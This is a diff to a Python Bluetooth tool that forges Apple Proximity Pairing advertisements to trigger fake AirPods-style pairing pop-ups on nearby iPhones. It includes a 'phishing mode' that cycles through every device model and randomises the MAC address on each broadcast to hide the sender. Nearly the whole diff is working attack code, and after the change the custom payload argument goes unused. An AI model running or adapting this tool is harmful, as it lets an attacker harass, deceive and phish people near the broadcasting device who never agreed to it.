@@ -1,8 +1,9 @@
 import time
 import random
-from core.hci_wrapper import start_le_advertising, stop_le_advertising, open_dev
+from apybluez.hci.wrapper import start_spoof, stop_spoof
+from apybluez.apple.proximity import ProximityPairingPacket
+from apybluez.exceptions import HCISpoofingError
 from modules.reset import reset_adapter
-from core.packet_builder import ProximityPairingPacket
 
 class AdvertisingModule:
     DEVICE_DATA = {
@@ -37,16 +38,14 @@ class AdvertisingModule:
         else:
             print(message)
 
-    def start_spoof(self, interval_ms=200, custom_payload=None, model_name="AirPods", phishing_mode=False):
+    def start_spoof(self, interval_ms=160, custom_payload=None, model_name="AirPods", phishing_mode=False):
+        reset_adapter(self.dev_id, self.console)
+        
         if phishing_mode:
             self.log(f"[bold red][*] Starting PHISHING MODE ([white]Cycling all models[/white]) on hci{self.dev_id}...[/bold red]")
         else:
             self.log(f"[bold blue][*] Starting Spoofing ([white]{model_name}[/white]) on hci{self.dev_id}...[/bold blue]")
         
-        self.sock = open_dev(self.dev_id)
-        if not self.sock:
-            return
-
         if phishing_mode:
             self.log(f"[red][*] PHISHING MODE ACTIVE. Cycling through all models. Look at your iPhone![/red]")
         else:
@@ -65,9 +64,12 @@ class AdvertisingModule:
 
         except KeyboardInterrupt:
             self.log("\n[yellow][*] Stopping Advertisement...[/yellow]")
-            stop_le_advertising(self.sock)
+            if self.sock:
+                stop_spoof(self.sock)
         except Exception as e:
             self.log(f"[red][!] Error: {e}[/red]")
+            if self.sock:
+                stop_spoof(self.sock)
 
     def _spoof_loop(self, interval_ms, custom_payload, model_name, phishing_mode):
         while True:
@@ -75,37 +77,34 @@ class AdvertisingModule:
                  keys = list(self.DEVICE_DATA.keys())
                  for k in keys:
                      m = self.DEVICE_DATA[k]['name']
-                     packet_data = self.build_packet(m)
-                     start_le_advertising(self.sock, min_interval=100, max_interval=100, data=packet_data)
-                     time.sleep(2)
-                     stop_le_advertising(self.sock)
-                     time.sleep(0.1)
+                     try:
+                         rand_mac = bytes([random.randint(0, 255) for _ in range(6)])
+                         mac_str = ':'.join(f'{b:02x}' for b in rand_mac)
+                         
+                         self.log(f"[dim]Spoofing {m} on {mac_str}[/dim]") 
+                         
+                         self.sock = start_spoof(model_name=m, device_id=self.dev_id, 
+                                               interval_min=100, interval_max=100, 
+                                               random_mac=rand_mac)
+                         time.sleep(2)
+                         stop_spoof(self.sock)
+                         self.sock = None
+                         time.sleep(0.1)
+                     except HCISpoofingError as e:
+                         self.log(f"[red][!] Spoof error: {e}[/red]")
             else:
-                packet_data = ()
-                if custom_payload:
-                    packet_data = custom_payload
-                else:
-                    packet_data = self.build_packet(model_name)
+                try:
+          
+                    rand_mac = bytes([random.randint(0, 255) for _ in range(6)])
+                    mac_str = ':'.join(f'{b:02x}' for b in rand_mac)
                     
-                start_le_advertising(self.sock, min_interval=interval_ms, max_interval=interval_ms, data=packet_data)
-                time.sleep(2)
-                stop_le_advertising(self.sock)
-                time.sleep(0.1)
-
-    def build_packet(self, name):
-        try:
-             bat_left = random.randint(10, 100)
-             bat_right = random.randint(10, 100)
-             bat_case = random.randint(10, 100)
-             return ProximityPairingPacket.build(
-                 model_name=name,
-                 battery_left=bat_left,
-                 battery_right=bat_right,
-                 battery_case=bat_case,
-                 charging_left=False,
-                 charging_right=False,
-                 charging_case=False,
-                 lid_open=True 
-             )
-        except:
-             return (0x1e, 0xff, 0x4c, 0x00, 0x07) 
+                    self.sock = start_spoof(model_name=model_name, device_id=self.dev_id, 
+                                          interval_min=interval_ms, interval_max=interval_ms,
+                                          random_mac=rand_mac)
+                    time.sleep(2)
+                    stop_spoof(self.sock)
+                    self.sock = None
+                    time.sleep(0.1)
+                except HCISpoofingError as e:
+                     self.log(f"[red][!] Spoof error: {e}[/red]")
+                     time.sleep(1) 
